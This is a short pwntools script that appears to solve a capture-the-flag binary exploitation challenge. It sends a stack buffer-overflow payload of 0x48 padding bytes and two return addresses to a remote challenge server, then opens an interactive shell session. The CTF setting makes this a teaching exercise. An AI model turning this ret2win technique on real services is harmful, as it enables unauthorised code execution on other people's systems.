from pwn import * 

# io = process("./chal")
io = remote("challs.ctf-cyberdune.online", 10029)

payload = b'A' * 0x48
payload += p64(0x401016)
payload += p64(0x401176)

io.sendline(payload)

io.interactive()
